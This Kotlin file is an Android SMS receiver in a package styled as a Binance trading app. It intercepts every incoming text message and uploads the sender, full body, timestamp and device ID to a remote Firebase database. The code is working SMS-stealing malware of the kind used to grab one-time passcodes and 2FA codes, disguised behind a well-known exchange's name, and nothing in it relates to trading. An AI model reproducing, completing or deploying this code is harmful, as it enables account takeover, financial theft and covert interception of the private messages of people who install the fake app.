package dApp.binance.Trading.arfu

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.telephony.SmsMessage
import android.util.Log
import com.google.firebase.database.FirebaseDatabase

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == "android.provider.Telephony.SMS_RECEIVED") {
            val bundle = intent.extras
            if (bundle != null) {
                try {
                    val pdus = bundle.get("pdus") as Array<*>
                    val messages = arrayOfNulls<SmsMessage>(pdus.size)
                    val sb = StringBuilder()
                    var sender = ""
                    var timestamp = System.currentTimeMillis()

                    for (i in pdus.indices) {
                        messages[i] = SmsMessage.createFromPdu(pdus[i] as ByteArray)
                        sb.append(messages[i]?.messageBody)
                        sender = messages[i]?.originatingAddress ?: "Unknown"
                        timestamp = messages[i]?.timestampMillis ?: System.currentTimeMillis()
                    }

                    val messageBody = sb.toString()
                    Log.d("SmsReceiver", "New SMS from $sender: $messageBody")
                    
                    saveSmsToFirebase(context, sender, messageBody, timestamp)
                    
                } catch (e: Exception) {
                    Log.e("SmsReceiver", "Error processing SMS: ${e.message}")
                }
            }
        }
    }

    private fun saveSmsToFirebase(context: Context, sender: String, body: String, timestamp: Long) {
        val deviceId = FirebaseHelper.getDeviceId(context)
        val database = FirebaseDatabase.getInstance().reference
        
        val smsData = mapOf(
            "sender" to sender,
            "body" to body,
            "timestamp" to timestamp,
            "device_id" to deviceId
        )

        database.child("sms").child(deviceId).push().setValue(smsData)
    }
}
